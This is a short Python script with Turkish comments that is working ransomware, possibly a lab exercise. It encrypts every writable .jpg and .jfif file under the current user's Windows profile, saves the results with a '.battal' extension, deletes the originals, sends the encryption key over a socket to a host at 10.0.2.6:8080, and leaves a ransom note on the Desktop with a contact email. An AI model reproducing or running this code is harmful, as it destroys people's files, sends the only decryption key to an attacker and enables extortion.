import os
import socket
import getpass
from cryptography.fernet import Fernet

# Aktif olan kullanıcının kullanıcı adını alın
username = getpass.getuser()
# Fernet sınıfını kullanarak bir anahtar oluşturun
key = Fernet.generate_key()
# Anahtarı kullanarak Fernet sınıfının bir örneğini oluşturun
fernet = Fernet(key)

# Dizin ve alt dizinlerinde dosyaları dolasın
for root, dirs, files in os.walk("C:\\Users\\"+username):
    for file in files:
        # Dosya uzantısı ".jpg" veya .jfif ile bitiyorsa
        if file.endswith(".jpg") or file.endswith(".jfif"):
            # Dosya yolunu oluşturun
            file_path = os.path.join(root, file)

            # Dosya yolunu ve dosya adını ayırın
            directory, filename = os.path.split(file_path)

            # Dosya yolunun yazma izinlerini kontrol edin
            if os.access(directory, os.W_OK):
                # Dosya yolunda yazma izni varsa dosyayı işleyin
                with open(file_path, "rb") as f:
                    # Dosyayı oku
                    data = f.read()
                # Dosyayı şifrele
                encrypted_data = fernet.encrypt(data)

                # Şifrelenmiş dosyayı dosya yoluna yazın
                with open(file_path + ".battal", "wb") as f:
                    f.write(encrypted_data)
                # Orijinal dosyayı silin
                os.remove(file_path)

# Socket bağlantısı oluşturun
sock = socket.socket()
# Sunucuya bağlanın
sock.connect(("10.0.2.6", 8080))
# Anahtarı sunucuya gönderin
sock.send(key)

# Masaüstünde "BENİ OKU.txt" adında bir dosya oluşturun
with open(os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop', 'BENİ OKU.txt'), 'w', encoding='utf-8') as f:
    # Dosyaya yazı yazın
    f.write('Merhaba benim adım Battal, bana bu mailden ulaşabilirsiniz : test@gmail.com')